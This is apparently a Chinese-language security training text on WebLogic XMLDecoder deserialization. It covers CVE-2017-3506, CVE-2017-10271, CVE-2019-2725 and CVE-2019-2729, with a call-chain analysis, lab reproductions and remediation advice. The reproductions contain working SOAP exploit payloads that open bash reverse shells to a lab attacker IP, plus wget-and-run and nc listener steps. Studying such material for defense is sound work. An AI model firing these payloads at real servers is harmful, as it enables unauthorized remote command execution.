[TOC]



# ==WeblogicXMLDecoder反序列化==

教材内容

## Weblogic XMLDecoder 反序列化漏洞

> ### 一、漏洞原理
>
> 1. **XMLDecoder的使用**：WebLogic在解析用户传入的XML数据时使用了XMLDecoder。XMLDecoder是Java提供的一个用于将XML文档反序列化为Java对象的工具。
> 2. **反序列化漏洞**：如果攻击者能够构造出恶意的XML数据，这些数据在通过XMLDecoder解析时可能会被反序列化为恶意对象，进而执行任意代码或命令。
> 3. **漏洞触发条件**：通常，攻击者需要通过Web服务或其他途径将恶意XML数据发送给存在漏洞的WebLogic服务器。服务器在解析这些数据时，如果没有进行适当的验证和处理，就会触发漏洞。

### 1.XMLDecoder 反序列化

#### 1.1 XMLEncoder&XMLDecoder

 XMLDecoder/XMLEncoder 是在JDK1.4版中添加的 XML 格式序列化持久性方案，使用 XMLEncoder 来生成表示 JavaBeans 组件(bean)的 XML 文档，用 XMLDecoder 读取使用 XMLEncoder 创建的XML文档获取JavaBeans。

#### 1.2 XML标签

##### string标签

字符串“hello，world”表示如下：

```xml
 <string>Hello,world</string>
```

##### object标签

通过 \ 标签表示对象， 其class 属性指定具体类(用于调用其内部方法)， method 属性指定具体方法名称(比如构造函数的的方法名为 new )。

`new JButton(“Hello,world”) `

对应的XML文档如下:

```xml
<object class="javax.swing.JButton" method="new">     
    <string>Hello,world</string> 
</object>
```

##### void标签

通过 \ 标签表示函数调用、赋值等操作， method 属性指定具体的方法名称。

`JButton b = new JButton();b.setText(“Hello, world”); `

对应的XML文档如下:

```xml
<object class="javax.swing.JButton">     
    <void method="setText">         
        <string>Hello,world</string>     
    </void> 
</object>
```

##### array标签

通过 \ 标签表示数组， class 属性指定具体类，在array标签内部使用 void 标签的 index 属性来指定数组索引赋值。

`String[] s = new String[2];s[1] = “Hello,world”;`

 对应的XML文档如下:

```xml
<array class="java.lang.String" length="2">      
    <void index="1">         
        <string>Hello,world</string>       
    </void> 
</array>
```

### XMLDecoder 反序列化漏洞

在idea上创建一个新的java项目。

![image-20220525110937458](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220525110937.png)

而后在com/test下创建一个Test类，读取XML文档以创建XMLDecoder类的实例化对象a，而后再使用readObject()方法触发反序列化漏洞，代码如下：

```java
package com.test;
import java.beans.XMLDecoder;
import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
public class Test {    
    public static void main(String[] args) throws FileNotFoundException {        
        XMLDecoder a = new XMLDecoder(new BufferedInputStream(new FileInputStream("src/com/test/poc.xml")));        
        Object result = a.readObject();        
        a.close();    
    }
}
```

编写用于反序列化的XML，执行calc，打开计算器，如下：

pom.xml

```xml
<java version="1.8.0" class="java.beans.XMLDecoder">         
    <object class="java.lang.ProcessBuilder">          
        <array class="java.lang.String" length="1">                
            <void index="0">                    
                <string>calc</string>                
            </void>          
        </array>          
        <void method="start"></void>    
    </object>
</java>
```

运行后，即可打开计算器。

![image-20220525110557509](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220525110604.png)

### CVE-2017-3506

#### 2.1 漏洞简介 

Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的SOAP（XML）数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。 

影响版本：10.3.6.0，12.1.3.0，12.2.1.1，12.2.1.2

#### 2.2 漏洞分析

- 2.2.1 判断漏洞存在 

若访问 /wls-wsat/CoordinatorPortType，出现如下页面，则可能存在此漏洞。

![image-20220525151019205](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220525151019.png)

 只要在wls-wsat这个war包中的uri皆受到影响，打开web.xml查看所有受到影响的uri路径。

```
默认受到影响的uri如下:
/wls-wsat/CoordinatorPortType/
wls-wsat/RegistrationPortTypeRPC/
wls-wsat/ParticipantPortType/
wls-wsat/RegistrationRequesterPortType/
wls-wsat/CoordinatorPortType11/
wls-wsat/RegistrationPortTypeRPC11/
wls-wsat/ParticipantPortType11/
wls-wsat/RegistrationRequesterPortType11
```

- 2.2.2 漏洞调用链分析 

首先查看weblogic.wsee.jaxws.workcontext.WorkContextServerTube下的processRequest()方法，这里看到传入的var1参数是我们提交的sope（XML）数据，var2是从var1中获取的的headers，var3是从var2中的WorkAreaConstants.WORK_AREA_HEADER获取得到的，然后将var3放入readHeaderOld()方法中。

![image-20220526163624294](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526163624.png)

 接下来查看weblogic.wsee.jaxws.workcontext.WorkContextTube中的readHeaderOld()方法，这里将我们提交的sope（XML）中的XML格式序列化数据传给var4，接着建了WorkContextXmlInputAdapter()对象var6并将var4 的字节数组输入流传入其构造函数中。

![image-20220526164754182](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526164754.png)

跟着查看weblogic.wsee.workarea.WorkContextXmlInputAdapter的WorkContextXmlInputAdapter，发现其包含恶意 XML 的输入流作为参数传入 XMLDecoder 的构造函数，创建了对象xmlDecoder。

![image-20220526165755072](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526165755.png)

 再回到上层，看到var6又被传入recevie()方法。

![image-20220526170236225](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526170236.png)

 跟进receive()方法，其有调用receiveRequest() 方法处理xmlDecoder。

![image-20220526171039997](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526171040.png)

 继续跟进weblogic.workarea.WorkContextMapImpl的receiveRequest()方法，其中又调用了weblogic.workarea.WorkContextLocalMap的receiveRequest()方法处理对象xmlDecoder。

![image-20220526171150398](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526171150.png)

 跟进这个receiveRequest()方法，使用了WorkContextEntryImpl的readEntry()方法，

![image-20220526171359297](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526171359.png)

 在weblogic.workarea.spi.WorkContextEntryImpl的readEntry()方法中，调用readUTF()方法处理xmlDecoder。

![image-20220526171452934](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526171452.png) 

在readUTF中，我们看到它最终调用了xmlDecoder的readObject()方法进行反序列化操作，从而触发命令执行。

![image-20220526171556431](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526171556.png)

- 2.3 漏洞复现

2.3.1 实验环境服务器：

Centos 7 （IP：192.168.219.185）

Weblogic 版本：10.3.6.0

攻击机：kali（IP：192.168.219.134） 

这里使用vulhub的靶场环境，在Centos 7上创建一个目录 CVE-2017-3506，在其中创建一个docker-compose.yml文件，内容如下：

```yml
version: '2'
services: 
	weblogic:   
		image: vulhub/weblogic   
		ports:    
			- "7001:7001"    
			- "8453:8453"
```

而后在这个目录下直接运行 docker-compose up 即可拉取镜像，创建并运行容器。

- 2.3.2 复现过程 

访问http://192.168.219.185:7001/wls-wsat/CoordinatorPortType，而后使用brup拦截该请求，修改请求方法为POST，而后修改Content-Type为text/xml。

 在正文中填入如下payload进行利用，这里是使用bash进行反弹shell。

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">    
    <soapenv:Header>     
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">          
            <java class="java.beans.XMLDecoder">            
                <object class="java.lang.ProcessBuilder">                  
                    <array class="java.lang.String" length="3">                    
                        <void index="0"><string>/bin/bash</string></void>                    
                        <void index="1"><string>-c</string></void>                    
                        <void index="2"><string>bash -i >& /dev/tcp/192.168.219.134/4444 0>&1</string></void>                
                    </array>              
                    <void method="start"></void>            
                </object>        
            </java>    
        </work:WorkContext>   
    </soapenv:Header>    
    <soapenv:Body></soapenv:Body> 
</soapenv:Envelope>
```

在kali中使用nc监听4444端口。

![image-20220525160025378](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220525160025.png)

 修改的请求如下：

![image-20220525155826637](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220525155826.png)

 发送请求后，查看kali的nc，发现已经成功getshell。

![image-20220525155321804](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220525155321.png)

### CVE-2017-1027

#### 3.1 漏洞简介 

在更新CVE-2017-3506补丁之前，不对用户输入的SOAP（XML）数据进行验证，在其中使用object 标签就可以进行远程命令执行，CVE-2017-3506的补丁在weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中添加了validate方法，在解析xml时，Element字段出现object 标签就抛出运行时异常，不过这次防护力度不够，导致了CVE-2017-10271，利用方式与CVE-2017-3506类似，使用了void 标签绕过CVE-2017-3506的补丁，从而进行远程命令执行。 

影响版本：10.3.6.0，12.1.3.0，12.2.1.1，12.2.1.2

#### 3.2 漏洞复现

##### 3.2.1 实验环境

服务器：Centos 7 （IP：192.168.219.185）

Weblogic 版本：10.3.6.0

攻击机：kali（IP：192.168.219.134）

##### 3.2.2 复现过程 

CVE-2017-10271与CVE-2017-3506的复现过程相似，只不过需要将objec标签替换成void进行利用。访问http://192.168.219.185:7001/wls-wsat/CoordinatorPortType，而后使用brup拦截该请求，修改请求方法为POST，而后修改Content-Type为text/xml。

 在正文中填入如下payload进行利用，这里是使用bash进行反弹shell。

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">    
    <soapenv:Header>     
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">          
            <java class="java.beans.XMLDecoder">            
                <void class="java.lang.ProcessBuilder">                  
                    <array class="java.lang.String" length="3">                    
                        <void index="0"><string>/bin/bash</string></void>                    
                        <void index="1"><string>-c</string></void>                    
                        <void index="2"><string>bash -i >& /dev/tcp/192.168.219.134/4444 0>&1</string></void>                
                    </array>              
                    <void method="start"></void>            
                </object>        
            </java>    
        </work:WorkContext>   
    </soapenv:Header>    
    <soapenv:Body></soapenv:Body> 
</soapenv:Envelope>
```

在kali中使用nc监听4444端口。 修改请求如下：

![image-20220525161502864](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220525161502.png)

 发送请求后，查看kali的nc，发现已经成功getshell。

![image-20220525160546999](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220525160547.png)

### CVE-2019-2725

#### 4.1 漏洞简介 

该漏洞依旧是根据 weblogic 的 xmldecoder反序列化漏洞，WebLogic部分版本中默认包含的wls9_async_response包，为WebLogic Server提供异步通讯服务。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP 请求，获得目标服务器的权限，在未授权的情况下远程执行命令。 

影响版本:10.3.6.0，12.1.3.0，12.2.1.3, 12.2.1.4，14.1.1.0

#### 4.2 漏洞分析 

CVE-2019-2725漏洞与前两个漏洞相似，只不过利用的是wls9_async_response这个war包， 若访问 /_async/AsyncResponseService，响应如下页面，则可能存在该漏洞。_

![image-20220525160918242](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220525160918.png)

 若访问/_async/，响应403，也可能存在漏洞。_

![image-20220525160949997](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220525160950.png)

 只要是在bea_wls9_async_response包中的uri皆受到影响，可以打开web.xml查看所有受到影响的uri 。

```
默认受影响的uri:
/_async/AsyncResponseService
/_async/AsyncResponseServiceJms
/_async/AsyncResponseServiceHttp
```

#### 4.3 漏洞复现

##### 4.3.1 实验环境

服务器：Centos 7 （IP：192.168.219.185）

Weblogic 版本：10.3.6.0

攻击机：kali（IP：192.168.219.134）

#### 4.3.2 复现过程 

CVE-2017-10271与前面的两个漏洞复现过程相似，利用点在bea_wls9_async_response包中的uri。访问http://192.168.219.185:7001/_async/AsyncResponseService，而后使用brup拦截该请求，修改请求方法为POST，而后修改Content-Type为text/xml。

 在正文中填入如下payload进行利用，这里是使用bash进行反弹shell。

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService">     
    <soapenv:Header><wsa:Action>xx</wsa:Action>        
        <wsa:RelatesTo>xx</wsa:RelatesTo>        
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">        
            <java class="java.beans.XMLDecoder">            
                <void class="java.lang.ProcessBuilder">                
                    <array class="java.lang.String" length="3">                
                        <void index="0"><string>/bin/bash</string></void>                
                        <void index="1"> <string>-c</string></void>                
                        <void index="2"><string>bash -i >& /dev/tcp/192.168.219.134/4444 0>&1</string></void>                
                    </array>                
                    <void method="start"></void>            
                </void>        
            </java>        
        </work:WorkContext>    
    </soapenv:Header>    
    <soapenv:Body>        
        <asy:onAsyncDelivery></asy:onAsyncDelivery>    
    </soapenv:Body>
</soapenv:Envelope>
```

修改的请求如下：

![image-20220525162943999](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220525162944.png)

 在kali上使用”nc -lvp 4444”监控4444端口。 发送请求后，查看kali的nc，发现已经成功getshell。

![image-20220525163603634](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220525163603.png)

### CVE-2019-2729

#### 5.1 漏洞简介 

CVE-2019-2729漏洞是对CVE-2019-2725漏洞补丁进行绕过，形成新的漏洞利用方式，属于CVE-2019-2725漏洞的变形绕过。与CVE-2019-2725漏洞相似，CVE-2019-2729漏洞是由于应用在处理反序列化输入信息时存在缺陷，攻击者可以通过发送精心构造的恶意HTTP请求，用于获得目标服务器的权限，并在未授权的情况下执行远程命令，最终获取服务器的权限。

影响版本：10.3.6.0，12.1.3.0， 12.2.1.3

#### 5.2 漏洞复现

##### 5.2.1 实验环境

服务器：Centos 7 （IP：192.168.219.185）

Weblogic 版本：10.3.6.0

攻击机：kali（IP：192.168.219.134）

利用工具：https://github.com/ruthlezs/CVE-2019-2729-Exploit/blob/master/oracle-weblogic-deserialize.py

##### 5.2.2 复现过程​ 

前面CVE-2017-3506的补丁是过滤了object，CVE-2017-10271的补丁是过滤了new，method标签，且void后面只能跟index，array后面可以跟class，但是必须要是byte类型的。​

 而CVE-2019-2725的补丁也是使用黑名单禁用了class标签，但是我们可以使用 <array method =“forName"> 代替 class 标签即可。访问http://192.168.219.185:7001/wls-wsat/CoordinatorPortType，而后使用brup拦截该请求。

将利用工具中的req.txt提取出来，放于请求中，请求头部添加lfcmd字段，填写whoami命令，用于验证。发送后查看到命令回显。

![image-20220526105153865](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526105153.png)

 在kali上的/tmp下编写一个shell脚本（shell.sh），用bash进行反弹shell，内容如下：

`bash -i >& /dev/tcp/192.168.219.134/4444 0>&1`​ 

而后在kali的/tmp下，使用 “python -m SimpleHTTPServer”，开启一个HTTP服务，后续让Weblogic服务器获取shell.sh。

![image-20220526145452438](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526145452.png)

 在kali上使用漏洞利用工具，执行wget命令下载tmp目录下的shell.sh。

![image-20220526145800849](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526145800.png)

 使用 “nc -lvp 4444” ，监听4444端口。​ 在kali上使用漏洞利用工具，让服务器执行shell.sh，获取反弹shell。

![image-20220526145944078](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526145944.png)

 查看nc，发现shell连接成功。

![image-20220526144942323](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/zhengyu/20220526144942.png)

### 修复建议

1、安装最新的官方补丁，前三个漏洞补丁都是采用黑名单的方式进行标签过滤，存在绕过方法，而CVE-2019-2729的补丁终于是使用了白名单进行标签过滤。

2、配置URL访问控制策略，禁止对/_async/及/wls-wsat/路径的访问。

3、根据情况删除不安全文件，删除wls9_async_response.war与wls-wsat.war文件及相关文件夹，并重启Weblogic服务。

### 参考文章

WebLogic历史漏洞汇总与复现（https://blog.csdn.net/m0_48108919/article/details/123983141）

WebLogic-XMLDecoder反序列化漏洞分析（http://www.ghtwf01.cn/index.php/archives/252/）

weblogic 反序列化 (CVE-2019-2729)复现（https://blog.csdn.net/YouthBelief/article/details/121115028)